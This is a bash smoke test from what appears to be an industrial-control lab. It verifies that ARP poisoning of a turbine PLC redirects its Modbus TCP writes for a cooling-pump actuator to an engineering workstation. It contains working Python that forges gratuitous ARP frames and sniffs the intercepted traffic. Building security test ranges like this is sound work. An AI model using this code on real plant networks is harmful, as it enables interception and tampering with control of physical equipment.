#!/usr/bin/env bash
# L2-to-L4 surface probe. After the visitor poisons PLC's ARP cache for the
# cooling pump (see test_arp_poisoning_control_zone), the PLC's modbus
# writes redirect to eng-ws's NIC at the L2 level. This test proves the
# redirection actually achieves L3 traffic interception: eng-ws receives
# the TCP/502 frames the PLC thought it was sending to the cooling pump.
# That is the precondition for a real MITM (drop, modify, or relay).
#
# Coverage:
#   Stage 1  poison PLC's ARP for 10.10.3.52 (cooling pump)
#   Stage 2  raw-socket sniffer on eng-ws eth2 captures redirected traffic
#   Stage 3  captured frames are PLC->cooling-pump Modbus TCP (proto 6, port 502)
#   Stage 4  cleanup: flush PLC ARP, normal poll resumes
#
# The probe stops at "eng-ws sees the bytes". A full MITM would also bind
# a Modbus server on eng-ws to send forged replies; that would interfere
# with the cooling pump's actual setpoint and is out of smoke-test scope.
#
# Usage: bash tests/smoke/test_modbus_mitm_via_arp.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

PIVOT="engineering-workstation"
PIVOT_IFACE="eth2"
VICTIM="turbine_plc"
VICTIM_IP="10.10.3.21"
VICTIM_NEIGH_IFACE="eth1"
TARGET_IP="10.10.3.52"          # actuator_cooling_pump
TARGET_CONTAINER="actuator_cooling_pump"
TARGET_IFACE="eth1"
MODBUS_PORT=502

require_running "$PIVOT"
require_running "$VICTIM"
require_running "$TARGET_CONTAINER"

PIVOT_MAC="$(docker exec "$PIVOT" sh -c "cat /sys/class/net/${PIVOT_IFACE}/address" | tr -d '\r\n')"
REAL_MAC="$(docker exec "$TARGET_CONTAINER" sh -c "cat /sys/class/net/${TARGET_IFACE}/address" | tr -d '\r\n')"
[ -n "$PIVOT_MAC" ] || fail "could not read $PIVOT MAC"
[ -n "$REAL_MAC" ]  || fail "could not read $TARGET_CONTAINER MAC"

# Ensure PLC's ARP cache has a real entry to poison. The PLC writes HR[2]
# to the cooling pump every second, so the entry is normally REACHABLE.
PRE="$(docker exec "$VICTIM" ip neigh show "$TARGET_IP" dev "$VICTIM_NEIGH_IFACE" 2>&1)"
[ -n "$PRE" ] || fail "PLC has no ARP entry for $TARGET_IP"
assert_contains "$PRE" "$REAL_MAC" "PLC cache holds the real actuator MAC at start"

# Combined poison-and-sniff in a single Python process on the pivot. The
# sniffer runs in a thread, then we send 3 gratuitous ARPs and wait. Output
# is one JSON line summarising what got captured.
echo "[mitm] Stage 1 + 2: poison PLC ARP and sniff for redirected traffic on eng-ws"
SNIFF_JSON="$(docker exec "$PIVOT" python3 -c "
import socket, threading, json, time

hits = []
done = threading.Event()

def sniff():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
    s.bind(('${PIVOT_IFACE}', 0))
    s.settimeout(10)
    while not done.is_set():
        try: data, _ = s.recvfrom(2048)
        except socket.timeout: break
        if len(data) < 34: continue
        proto = data[14+9]
        dst = '.'.join(str(b) for b in data[14+16:14+20])
        if dst != '${TARGET_IP}': continue
        if proto == 6 and len(data) >= 14+20+4:  # TCP
            ihl = (data[14] & 0x0f) * 4
            dport = (data[14+ihl+2] << 8) | data[14+ihl+3]
            hits.append({'proto': 'TCP', 'dport': dport})
        else:
            hits.append({'proto': proto})

t = threading.Thread(target=sniff, daemon=True); t.start()
time.sleep(0.4)

def mac2b(m): return bytes(int(x,16) for x in m.split(':'))
def ip2b(i): return socket.inet_aton(i)
my_mac = '${PIVOT_MAC}'
frame = mac2b('ff:ff:ff:ff:ff:ff') + mac2b(my_mac) + b'\x08\x06' + \
    b'\x00\x01\x08\x00\x06\x04\x00\x02' + \
    mac2b(my_mac) + ip2b('${TARGET_IP}') + \
    mac2b('ff:ff:ff:ff:ff:ff') + ip2b('${VICTIM_IP}')
sk = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
sk.bind(('${PIVOT_IFACE}', 0))
for _ in range(3): sk.send(frame)

time.sleep(8)
done.set()
t.join(2)
print(json.dumps({'count': len(hits), 'hits': hits[:5]}))
" 2>&1)"

COUNT="$(printf '%s' "$SNIFF_JSON" | python3 -c 'import sys, json; print(json.load(sys.stdin)["count"])' 2>/dev/null || echo 0)"
ok "sniffer + poison ran (raw output: $SNIFF_JSON)"

echo "[mitm] Stage 3: redirected traffic is Modbus TCP on port 502"
if [ "$COUNT" -ge 3 ]; then
    ok "captured $COUNT redirected packets in 8s on eng-ws"
else
    fail "only $COUNT packets captured (need >= 3); ARP poison may not have landed"
fi
# Spot-check first packet is Modbus (TCP/502)
FIRST_PROTO="$(printf '%s' "$SNIFF_JSON" | python3 -c 'import sys, json
h = json.load(sys.stdin)["hits"]
print(h[0]["proto"] if h else "")' 2>/dev/null)"
FIRST_DPORT="$(printf '%s' "$SNIFF_JSON" | python3 -c 'import sys, json
h = json.load(sys.stdin)["hits"]
print(h[0].get("dport", "") if h else "")' 2>/dev/null)"
assert_contains "$FIRST_PROTO" "TCP" "first redirected packet is TCP"
assert_contains "$FIRST_DPORT" "$MODBUS_PORT" "destination port is $MODBUS_PORT (Modbus)"

echo "[mitm] Stage 4: cleanup, restore PLC ARP cache"
docker exec "$VICTIM" ip neigh del "$TARGET_IP" dev "$VICTIM_NEIGH_IFACE" >/dev/null 2>&1 || true
sleep 3
POST="$(docker exec "$VICTIM" ip neigh show "$TARGET_IP" dev "$VICTIM_NEIGH_IFACE" 2>&1)"
assert_contains "$POST" "$REAL_MAC" "PLC ARP back to real actuator MAC after flush"

summary
